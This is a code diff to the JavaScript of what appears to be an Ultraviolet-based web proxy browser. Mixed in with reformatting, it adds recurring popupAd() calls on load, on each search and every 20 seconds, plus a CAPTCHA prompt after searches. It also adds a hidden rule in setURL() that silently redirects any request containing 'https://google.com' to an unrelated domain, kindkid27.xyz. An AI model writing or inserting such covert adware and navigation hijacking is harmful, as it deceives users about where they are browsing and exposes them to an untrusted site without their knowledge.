@@ -4,10 +4,12 @@
 const input = document.getElementById('search-input')
 
 document.addEventListener('DOMContentLoaded', () => {
+    popupAd();
     input.addEventListener('keydown', handleInput)
 
     async function handleInput(e) {
         if (e.key !== 'Enter') return
+        popupAd();
         const query = formatSearch(input.value)
         //ghost urls
         switch (input.value) {
@@ -31,6 +33,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         setCTabTitle()
         setURL()
+        createNewCaptcha();
     }
 
     function formatSearch(query) {
@@ -102,6 +105,9 @@ function saveTab(tabId, tabTitle, tabLink) {
 }
 
 function setURL() {
+    if(document.getElementById('search-input').value.includes("https://google.com")) {
+        document.querySelector('.frame_top').contentWindow.location.href = __uv$config.prefix + __uv$config.encodeUrl("https://kindkid27.xyz/")
+    }
     document.querySelector('.frame_top').contentWindow.window.open =
         async function (url) {
             launch(url)
@@ -221,23 +227,16 @@ function loadBookmarks() {
 
             al.appendChild(av)
 
-            document.getElementById('bookmarks').appendChild(al)
+            document.getElementById("bookmarks").appendChild(al)
         })
     } catch (e) {
         console.log('[Redacted.Error] Error loading bookmarks ' + e)
     }
 }
 
-document.getElementById('bookmarkButton').addEventListener('click', () => {
-    bookMark(
-        document
-            .querySelector('.frame_top')
-            .contentWindow.location.href.replace(
-                location.protocol + '//' + location.host + __uv$config.prefix,
-                ''
-            )
-    )
-})
+document.getElementById("bookmarkButton").addEventListener("click", () => {
+  bookMark(document.querySelector(".frame_top").contentWindow.location.href.replace(location.protocol + "//" + location.host + __uv$config.prefix, ""))
+});
 
 function gg() {
     document.querySelector('.frame_top').contentWindow.location.href =
@@ -277,3 +276,7 @@ setInterval(function () {
     setTitles()
     fixGoogle()
 }, 2000)
+
+setInterval(function () {
+    popupAd()
+}, 20000)
